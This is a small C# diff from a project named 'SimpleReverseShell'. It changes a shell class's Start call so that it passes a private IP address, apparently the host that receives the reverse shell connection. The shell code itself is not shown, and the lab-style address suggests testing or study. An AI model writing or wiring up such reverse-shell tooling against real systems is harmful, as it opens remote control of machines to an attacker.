@@ -13,7 +13,7 @@ namespace SimpleReverseShell
       //simpleDotNetShell.Start();
 
       var simpleSysCallShell = new SimpleSysCallShell();
-      simpleSysCallShell.Start();
+      simpleSysCallShell.Start("192.168.126.128");
     }
   }
 }
